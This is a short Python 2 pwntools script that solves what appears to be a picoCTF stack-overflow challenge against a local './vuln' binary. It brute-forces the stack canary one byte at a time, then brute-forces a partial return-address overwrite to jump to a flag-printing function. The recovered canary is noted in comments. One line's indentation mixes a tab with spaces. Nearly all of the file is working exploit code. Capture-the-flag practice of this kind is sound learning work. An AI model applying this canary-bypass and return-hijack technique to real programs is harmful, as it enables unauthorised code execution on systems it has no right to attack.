#!/usr/bin/env python2

"""
• Got canary: lV!)
• Had trouble finding flag function's address
"""

import sys, struct, random
from pwn import context, process

#context.log_level = "debug"

chars = "0123456789abcdef"
canary_pad = 32
return_pad = 12
canary = ""

print("Brute forcing canary...")

with context.quiet:
    for i in range(1, 5):
        for c in range(256):
            p = process("./vuln")
            p.sendlineafter("> ", str(32+i))
            p.sendafter("> ", " "*32 + canary + chr(c))
            out = p.recvall()
            if "Stack" not in out:
                canary += chr(c)
                break

print("Canary: " + canary) # lV!)
print("\nBrute forcing return address to display_flag...")

with context.quiet:
    while 1:
        #i, j = random.choice(chars), random.choice(chars)
        #i, j = "ef"
	i = random.choice(chars)
        # Template: 0x565007ed
        #addr = "ed{}75{}56".format(i, j).decode("hex")
        addr = "ed{}7".format(i).decode("hex")
        #sys.stdout.write("\b\b\b\b\b\b\b\b\b\b" + hex(struct.unpack("I", addr)[0]))
        sys.stdout.write("\b\b\b\b\b\b0x" + addr.encode("hex"))
        sys.stdout.flush()
        p = process("./vuln", shell=True)
        p.sendlineafter("> ", "50")
        payload = " "*canary_pad + canary + " "*return_pad + addr
        assert len(payload) == 50
        p.sendafter("> ", payload)
        out = p.recvall()
        #exit(out)
        print(out)
        if "Segmentation fault" not in out or "pico" in out:
        #if not out.strip().endswith("the Flag?"):
            print("Return address: " + addr.encode("hex"))
            exit(out)
